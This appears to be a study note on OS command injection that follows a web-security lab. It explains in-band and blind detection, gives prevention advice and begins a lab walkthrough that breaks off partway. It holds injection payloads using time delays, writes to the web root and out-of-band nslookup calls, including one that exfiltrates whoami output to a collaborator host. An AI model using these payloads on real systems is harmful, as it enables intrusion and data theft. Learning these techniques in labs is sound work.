
Command injection is a vulnerability where a attacker can run commands on a host operating system via a vulnerable application

## Types of command injection vulnerabilities -

#### 1. In-band command injection - 

  Here we receive the response of the command sent via http response.
  
How to detect ?

> Use **shell metacharacters** - `&` `;`  `Newline (0x0a or \n)` `&&`  `|`  `|| `  `'` `$` 
  

  
#### 2. Blind  command injection - 

  Here it does not return the output of the command within the HTTP response. 

How to detect ?

> - Trigger a **time-delay** using `ping` or `sleep` command 
> eg -
> 
>   `https://vulnerable-website/endpoint?parameter=x||ping -c 10+127.0.0.1||`  
>        `https://vulnerable-website/endpoint?parameter=x & sleep 10 &`

>
> - Output the **response of the command to web root** and access the file directly via web browser. 
> eg - `https://vulnerable-website/endpoint?parameter=||whoami>/var/www/images/output.txt||`

> - Open an **Out-of Band channel to a server you control** like Burp collaborator.
> eg - `https://vulnerable-website/endpointparameter=x||nslookup+burp.collaborator.address||`
> 
> TIP - Exfiltrate the output of your command 
> 
> ```https://vulnerable-website/endpointparameter=||nslookup+`whoami`.burp.collaborator.address||```

#### Some vulnearble functions - 

```

-   exec
-   command
-   execute
-   ping
-   query
-   jump
-   code
-   reg
-   do
-   func
-   arg
-   option
-   load
-   process
-   step
-   read
-   function
-   req
-   feature
-   exe
-   payload
-   run
-   print
```



## Prevent -
- Avoid using shell execution functions. If unavoidable, limit their use to very specific use cases.
- Perform proper input validation when taking user input into a shell execution command.
- Use a safe API when accepting user input into the application.
- Escape special characters in the case where a safe API is not available.

----------------------------------------

## LAB 1 - OS command injection, simple case  [APPRENTICE]

```
This lab contains an OS command injection `vulnerability in the product stock checker`.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the `whoami` command to determine the name of the current user.
```

**Solution -**

Vulnerability is in check stock filter 

![image](https://user-images.githubusercontent.com/67383098/225234017-13d55e1d-074c-40e9-ab3e-afea6521d066.png)

On clicking the link, the request & response looks like

![image](https://user-images.githubusercontent.com/67383098/225234846-54839e9f-d6a2-4e36-8b8b-fe493a112676.png)

![image](https://user-images.githubusercontent.com/67383098/225235472-03edc2dd-d895-4e42-9720-46ab3a2445fc.png)



We need to check which parameter is vulnerable [`productID` or `storeID`]






















